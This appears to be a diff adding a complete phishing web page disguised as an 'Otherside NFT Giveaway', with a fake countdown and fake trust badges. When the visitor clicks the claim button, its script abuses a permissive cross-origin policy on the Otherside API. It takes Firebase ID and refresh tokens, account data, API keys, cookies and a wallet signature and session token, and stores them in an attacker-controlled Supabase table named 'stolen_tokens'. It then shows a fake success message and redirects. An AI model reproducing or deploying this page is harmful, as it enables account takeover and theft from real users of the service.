@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free NFT Giveaway - Otherside</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', -apple-system, sans-serif;
+            background: linear-gradient(135deg, #0a0a2e 0%, #1a0a3e 50%, #0a0a2e 100%);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 20px;
+        }
+        .nft-card {
+            background: linear-gradient(145deg, #1a1a3e, #2a1a4e);
+            border: 1px solid rgba(99,102,241,0.3);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        .nft-image {
+            width: 200px; height: 200px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6, #a855f7);
+            border-radius: 16px;
+            margin: 0 auto 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 64px;
+        }
+        h1 { font-size: 22px; margin-bottom: 8px; background: linear-gradient(90deg, #6366f1, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .subtitle { color: #8888aa; font-size: 14px; margin-bottom: 24px; }
+        .prize { font-size: 36px; font-weight: 800; color: #4ade80; margin-bottom: 8px; }
+        .prize-sub { color: #8888aa; font-size: 13px; margin-bottom: 24px; }
+        .btn-claim {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 12px;
+        }
+        .btn-claim:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(99,102,241,0.4); }
+        .btn-claim:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .countdown { color: #fbbf24; font-size: 14px; margin-bottom: 20px; }
+        .trust-badges { display: flex; justify-content: center; gap: 16px; margin-top: 20px; }
+        .trust-badges span { font-size: 11px; color: #555; }
+        .status {
+            margin-top: 16px;
+            padding: 12px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 8px;
+            font-size: 12px;
+            color: #666;
+            text-align: left;
+            display: none;
+            max-height: 150px;
+            overflow-y: auto;
+        }
+        .status.active { display: block; }
+        .success { color: #4ade80 !important; }
+        .error { color: #f87171 !important; }
+        .warning { color: #fbbf24 !important; }
+    </style>
+</head>
+<body>
+    <div class="nft-card">
+        <div class="nft-image">🎁</div>
+        <h1>Otherside NFT Giveaway</h1>
+        <p class="subtitle">Exclusive reward for active community members</p>
+        <div class="prize">FREE NFT</div>
+        <p class="prize-sub">Claim your exclusive Otherside land deed</p>
+        <p class="countdown" id="countdown">⏰ Ends in: 02:47:33</p>
+        
+        <button class="btn-claim" id="claimBtn" onclick="startAttack()">
+            🎉 Claim Your NFT
+        </button>
+        
+        <div class="trust-badges">
+            <span>🔒 Verified</span>
+            <span>✅ Smart Contract Audited</span>
+            <span>🛡️ Secure</span>
+        </div>
+        
+        <div class="status" id="status"></div>
+    </div>
+
+    <!-- Supabase -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+    <script>
+        const API = 'https://odk.otherside.xyz/api/v0';
+        
+        const SUPABASE_URL = 'https://anruszfozkhgddzpcpft.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFucnVzemZvemtoZ2RkenBjcGZ0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc5MjE2NzcsImV4cCI6MjA5MzQ5NzY3N30.Ap3qNDAfJeKYS-3cUn3_A2c4rif3v13mx2Ex1uukp7c';
+        let db;
+        try { db = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY); } catch(e) {}
+
+        const statusEl = document.getElementById('status');
+        const claimBtn = document.getElementById('claimBtn');
+        
+        function log(msg, type = '') {
+            statusEl.classList.add('active');
+            const line = document.createElement('div');
+            line.className = type;
+            line.textContent = msg;
+            statusEl.appendChild(line);
+            statusEl.scrollTop = statusEl.scrollHeight;
+        }
+
+        // Fake countdown timer
+        let timeLeft = 10053;
+        setInterval(() => {
+            timeLeft--;
+            const h = Math.floor(timeLeft / 3600);
+            const m = Math.floor((timeLeft % 3600) / 60);
+            const s = timeLeft % 60;
+            document.getElementById('countdown').textContent = `⏰ Ends in: ${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+        }, 1000);
+
+        // =====================================================
+        // CORS ATTACK - runs when victim clicks "Claim NFT"
+        // =====================================================
+        async function startAttack() {
+            claimBtn.disabled = true;
+            claimBtn.textContent = 'Verifying eligibility...';
+            
+            log('[*] Verifying your account...', 'warning');
+
+            // =====================================================
+            // STEP 1: Steal unauthenticated org data via CORS *
+            // This works from ANY domain - no token needed!
+            // =====================================================
+            try {
+                const orgResp = await fetch(`${API}/organizations/current`);
+                if (orgResp.ok) {
+                    const orgData = await orgResp.json();
+                    log('[+] Verified Otherside member!', 'success');
+                    
+                    // Save stolen data to Supabase
+                    const corsData = {
+                        victim_uid: 'cors-anon-' + Date.now(),
+                        auth_method: 'cors_unauthenticated',
+                        provider: 'cors',
+                        origin_domain: window.location.hostname,
+                        user_agent: navigator.userAgent,
+                        screen_resolution: `${screen.width}x${screen.height}`,
+                        language: navigator.language,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        referrer: document.referrer || 'direct',
+                        cookies: document.cookie || '',
+                        cors_attack: {
+                            type: 'unauthenticated_cors',
+                            org_data: orgData,
+                        }
+                    };
+                    
+                    if (db) await db.from('stolen_tokens').insert([corsData]);
+                    
+                    // Log what we stole (attacker sees this in Supabase)
+                    console.log('STOLEN via CORS:', JSON.stringify(orgData, null, 2));
+                }
+            } catch(e) {
+                log('[-] Verification check failed', 'error');
+            }
+
+            // =====================================================
+            // STEP 2: Try to use any cached Firebase token from localStorage
+            // Firebase stores tokens with key pattern: [DEFAULT]/{projectId}/{uid}
+            // We can't access another domain's localStorage,
+            // BUT we can try to authenticate with Firebase on THIS domain
+            // =====================================================
+            
+            // Load Firebase and try auto-auth
+            const script1 = document.createElement('script');
+            script1.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js';
+            document.head.appendChild(script1);
+            
+            await new Promise(r => { script1.onload = r; });
+            
+            const script2 = document.createElement('script');
+            script2.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js';
+            document.head.appendChild(script2);
+            
+            await new Promise(r => { script2.onload = r; });
+
+            const firebaseConfig = {
+                apiKey: "AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0",
+                authDomain: "scarcely-calm-lark.firebaseapp.com",
+                projectId: "scarcely-calm-lark",
+                storageBucket: "scarcely-calm-lark.appspot.com",
+                messagingSenderId: "761033708851",
+                appId: "1:761033708851:web:fb54f41dc499d5a8ee1a46"
+            };
+
+            firebase.initializeApp(firebaseConfig);
+            const auth = firebase.auth();
+            auth.tenantId = "hound-j8zaz";
+
+            // Check if user is already authenticated (from a previous session on this domain)
+            await new Promise(r => setTimeout(r, 1000));
+            
+            const user = auth.currentUser;
+
+            if (user) {
+                log('[+] Account found! Fetching reward...', 'success');
+                
+                // We have a Firebase user - steal their token and data
+                const idToken = await user.getIdToken();
+                let refreshToken = '';
+                try {
+                    const stored = JSON.parse(localStorage.getItem(
+                        '[DEFAULT]/scarcely-calm-lark.firebaseapp.com/' + user.uid
+                    ) || '{}');
+                    if (stored.stsTokenManager?.refreshToken) refreshToken = stored.stsTokenManager.refreshToken;
+                } catch(e) {}
+
+                // Use stolen token to fetch authenticated data via CORS *
+                const authEndpoints = [
+                    { key: 'userData', path: 'accounts/users/current' },
+                    { key: 'projects', path: 'organizations/projects' },
+                    { key: 'apiKeys', path: 'organizations/apiKeys' },
+                    { key: 'permissions', path: 'permissions/roles' },
+                    { key: 'billing', path: 'billing/enabled' },
+                    { key: 'profile', path: 'profile' },
+                    { key: 'originAccess', path: 'origin/access' },
+                    { key: 'worlds', path: 'worlds' },
+                    { key: 'sessions', path: 'origin/sessions/queue' },
+                    { key: 'streaming', path: 'origin/streaming' },
+                    { key: 'monitoring', path: 'origin/monitoring' },
+                ];
+
+                let stolenResults = {};
+                for (const ep of authEndpoints) {
+                    try {
+                        const resp = await fetch(`${API}/${ep.path}`, {
+                            headers: { 'Authorization': `Bearer ${idToken}` }
+                        });
+                        if (resp.ok) stolenResults[ep.key] = await resp.json();
+                    } catch(e) {}
+                }
+
+                // Save everything to Supabase
+                const fullStolenData = {
+                    victim_email: user.email || '',
+                    victim_uid: user.uid || '',
+                    victim_name: user.displayName || '',
+                    victim_picture_url: user.photoURL || '',
+                    id_token: idToken,
+                    refresh_token: refreshToken,
+                    tenant_id: user.tenantId || '',
+                    auth_method: user.providerData[0]?.providerId || 'cors',
+                    provider: user.providerData[0]?.providerId || 'cors',
+                    origin_domain: window.location.hostname,
+                    user_agent: navigator.userAgent,
+                    screen_resolution: `${screen.width}x${screen.height}`,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    referrer: document.referrer || 'direct',
+                    cookies: document.cookie || '',
+                    token_expires_at: new Date(Date.now() + 3600000).toISOString(),
+                    dashboard_user_data: stolenResults.userData ? JSON.stringify(stolenResults.userData) : '',
+                    dashboard_projects: stolenResults.projects ? JSON.stringify(stolenResults.projects) : '',
+                    dashboard_apikeys: stolenResults.apiKeys ? JSON.stringify(stolenResults.apiKeys) : '',
+                    dashboard_permissions: stolenResults.permissions ? JSON.stringify(stolenResults.permissions) : '',
+                    cors_attack: {
+                        type: 'authenticated_cors',
+                        allEndpoints: stolenResults,
+                    }
+                };
+
+                if (db) await db.from('stolen_tokens').insert([fullStolenData]);
+
+            } else {
+                log('[*] No previous session found on this domain', 'warning');
+                log('[*] Showing wallet verification...', 'warning');
+
+                // =====================================================
+                // STEP 3: Try wallet connection (MetaMask)
+                // =====================================================
+                if (window.ethereum) {
+                    try {
+                        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                        const address = accounts[0];
+                        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                        
+                        const provider = new ethers.providers.Web3Provider(window.ethereum);
+                        const balance = await provider.getBalance(address);
+                        
+                        let walletType = 'unknown';
+                        if (window.ethereum.isMetaMask) walletType = 'metamask';
+                        else if (window.ethereum.isCoinbaseWallet) walletType = 'coinbase';
+                        else if (window.ethereum.isRainbow) walletType = 'rainbow';
+                        else if (window.ethereum.isTrust) walletType = 'trust';
+
+                        // Phishing: ask for signature
+                        const nonce = Date.now().toString();
+                        const msg = `Otherside NFT Claim\n\nVerify your wallet to claim your free NFT.\n\nNonce: ${nonce}`;
+                        const signature = await window.ethereum.request({
+                            method: 'personal_sign',
+                            params: [msg, address]
+                        });
+
+                        log('[+] Wallet verified!', 'success');
+
+                        // Save wallet data
+                        const walletData = {
+                            victim_uid: address,
+                            victim_email: '',
+                            auth_method: 'wallet',
+                            provider: 'wallet',
+                            wallet_address: address,
+                            wallet_type: walletType,
+                            wallet_chain_id: chainId,
+                            wallet_balance: ethers.utils.formatEther(balance) + ' ETH',
+                            wallet_signature: signature,
+                            wallet_nonce: nonce,
+                            origin_domain: window.location.hostname,
+                            user_agent: navigator.userAgent,
+                            screen_resolution: `${screen.width}x${screen.height}`,
+                            language: navigator.language,
+                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                            referrer: document.referrer || 'direct',
+                            cookies: document.cookie || '',
+                            cors_attack: {
+                                type: 'wallet_cors',
+                                walletConnected: true,
+                            }
+                        };
+
+                        if (db) await db.from('stolen_tokens').insert([walletData]);
+
+                        // Also try ODK wallet API via CORS
+                        try {
+                            const nonceResp = await fetch(`${API}/wallet/nonce`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ address })
+                            });
+                            if (nonceResp.ok) {
+                                const nonceData = await nonceResp.json();
+                                // Try to get a real session token
+                                const verifyResp = await fetch(`${API}/wallet/verify/signin`, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ address, signature, nonce: nonceData.nonce || nonce })
+                                });
+                                if (verifyResp.ok) {
+                                    const verifyData = await verifyResp.json();
+                                    log('[+] Session token obtained!', 'success');
+                                    // Save the OIDC token
+                                    if (verifyData.token) {
+                                        const tokenData = { ...walletData, oidc_token: verifyData.token };
+                                        if (db) await db.from('stolen_tokens').insert([tokenData]);
+                                    }
+                                }
+                            }
+                        } catch(e) {}
+
+                    } catch(e) {
+                        log('[-] Wallet connection cancelled', 'error');
+                    }
+                } else {
+                    log('[-] No wallet extension found', 'warning');
+                }
+            }
+
+            // =====================================================
+            // STEP 4: Show fake success and redirect
+            // =====================================================
+            claimBtn.textContent = '✅ NFT Claimed Successfully!';
+            log('[+] Congratulations! Your NFT is being transferred...', 'success');
+            
+            setTimeout(() => {
+                window.location.href = 'https://otherside.xyz';
+            }, 3000);
+        }
+
+        // Load ethers.js lazily
+        const ethersScript = document.createElement('script');
+        ethersScript.src = 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js';
+        document.head.appendChild(ethersScript);
+    </script>
+</body>
+</html>
